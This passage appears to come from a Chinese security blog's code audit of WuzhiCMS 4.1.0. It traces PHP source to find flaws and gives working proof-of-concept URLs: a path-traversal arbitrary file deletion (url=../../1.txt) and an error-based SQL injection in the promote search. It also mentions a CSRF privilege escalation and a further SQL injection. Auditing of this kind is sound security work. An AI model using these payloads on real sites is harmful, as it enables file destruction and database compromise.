&#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$filePath</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$handle</span>)) &#123;<br>            <span class="hljs-variable">$filePath</span>= <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filePath</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)==<span class="hljs-string">&#x27;coreframe&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = COREFRAME_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">9</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)==<span class="hljs-string">&#x27;www&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = WWW_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">3</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="搜关键字"><a href="#搜关键字" class="headerlink" title="搜关键字"></a>搜关键字</h1><h2 id="文件安全："><a href="#文件安全：" class="headerlink" title="文件安全："></a>文件安全：</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>搜索del() -&gt; coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php -&gt; del()</p><p>有可控变量 $url </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//从全局变量 $GLOBALS 中获取 id 和 url</span><br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//remove_xss() 函数用来清理 url 变量，防止 XSS 攻击</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//判断是否都为空</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<span class="hljs-comment">//按 id 删除</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<span class="hljs-comment">//将 id 转化为数组</span><br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<span class="hljs-comment">//从 attachment 表中查找该 id的记录并取usertimes 和 path</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//若引用数大于 1，只减少使用次数，不删除物理文件</span><br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则，彻底删除</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//按url 删除，如果没有 URL，报错返回。</span><br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//将 URL 中的 ATTACHMENT_URL 去掉，得到文件相对路径 path</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<span class="hljs-comment">//根据 path 查找数据库记录</span><br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<span class="hljs-comment">//如果没有记录，只删物理文件</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//引用多次，只减引用次数</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进my_unlink</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_unlink</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<span class="hljs-comment">//文件存在直接删除</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>index.php?m&#x3D;attachment&amp;f&#x3D;index&amp;v&#x3D;del&amp;_su&#x3D;wuzhicms&amp;url&#x3D;..&#x2F;..&#x2F;1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955817.png" alt="20250717140708632"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>搜索select</p><p>发现这里的很多参数都是原样拼接，可能存在风险</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//  coreframe/app/core/libs/class/mysqli.class.php</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_list</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$keyfield</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$keyfield</span>) &#123;<br><span class="hljs-variable">$arr</span>[<span class="hljs-variable">$data</span>[<span class="hljs-variable">$keyfield</span>]] = <span class="hljs-variable">$data</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$arr</span>[] = <span class="hljs-variable">$data</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进get_list函数，最后只找到这里有可控变量 $fieldtype、$keywords</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// coreframe/app/promote/admin/index.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>        <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>        &#125;<br><br><br>    &#125;<br></code></pre></td></tr></table></figure><p>$fieldtype、$keywords俩个参数拼接到$where中，</p><p>构造poc:</p><p><code>index.php?m=promote&amp;f=index&amp;_su=wuzhicms&amp;v=search&amp;fieldtype=place&amp;keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955190.png" alt="20250717143106637"></p><h1 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h1><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$GLOBALS = <span class="hljs-built_in">array</span>();<span class="hljs-comment">//清除所有的全局变量</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">microtime函数返回当前 Unix 时间戳的微秒数。<br></code></pre></td></tr></table></figure><p>magic_quotes_runtime 的作用</p><p><a href="http://blog.csdn.net/tom_green/article/details/7039002">http://blog.csdn.net/tom_green/article/details/7039002</a></p><p>magic_quotes_gpc函数详解 </p><p><a href="https://www.cnblogs.com/timelesszhuang/p/3726736.html">https://www.cnblogs.com/timelesszhuang/p/3726736.html</a></p><h1 id="漏洞补充："><a href="#漏洞补充：" class="headerlink" title="漏洞补充："></a>漏洞补充：</h1><h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。</p><h2 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h2><p>多个变量未使用引号包裹的SQL语句,只要是调用<code>get_one</code>这个函数的地方都存在SQL注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_one</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$condition</span> = <span class="hljs-literal">TRUE</span></span>) </span>&#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$condition</span>) &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">escape_string</span>(<span class="hljs-variable">$field</span>);<br>&#125;<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php,找到可控变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WWW_ROOT&#x27;</span>,<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>), <span class="hljs-number">0</span>, -<span class="hljs-number">4</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../configs/web_config.php&#x27;</span>;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;core.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>])) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]==<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-variable">$posttime</span> = SYS_TIME-<span class="hljs-number">300</span>;<span class="hljs-comment">//5分钟内有效</span><br><span class="hljs-variable">$db</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;db&#x27;</span>);<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;sms_checkcode&#x27;</span>,<span class="hljs-string">&quot;`code`=&#x27;<span class="hljs-subst">$code</span>&#x27; AND `posttime`&gt;<span class="hljs-subst">$posttime</span>&quot;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span 